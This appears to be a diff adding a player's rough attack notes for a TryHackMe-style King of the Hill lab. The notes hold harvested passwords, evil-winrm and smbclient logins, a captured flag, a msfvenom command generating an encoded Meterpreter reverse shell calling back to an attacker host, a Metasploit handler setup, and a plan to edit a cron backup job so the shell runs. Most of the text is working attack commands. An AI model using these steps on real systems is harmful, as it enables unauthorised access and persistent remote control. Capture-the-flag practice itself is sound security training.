@@ -1,0 +1,86 @@
+
+domain:
+
+kingofthe.domain
+
+
+
+
+http:80
+<!--Stop forgetting your password! It's: OfflineTV2020 Let me know when you've got it so I can remove this comment...-->
+
+
+
+smb / housekeys
+yvonne
+Tazers>St4rbux:3
+
+
+ssh yvonne
+Permission denied (publickey,password,keyboard-interactive)
+
+
+
+
+
+evil-winrm -i 10.10.58.222 -u yvonne -p "Tazers>St4rBux:3"
+
+
+
+
+smb
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	HouseKeys       Disk      
+	IPC$            IPC       Remote IPC
+	King            Disk      A script to pull king from the server
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk
+
+
+
+
+smbclient //10.10.58.222/King -U fed -p
+
+OfflineTV2020
+
+
+
+
+\Users\fed
+THM{02592D82BBA02DE324F72496B393D16F}
+
+
+
+
+
+
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.26.235 LPORT=4321 -e x86/shikata_ga_nai -f exe > shell.exe
+
+
+*put in fed's smb/king share and move to a folder owned by fed
+
+
+
+
+*msfconsole
+
+use exploit/multi/hanlder
+
+set payload windows/meterpreter/reverse_tcp
+
+
+run
+
+
+
+
+
+
+*edit cron backup job to run shell.exe
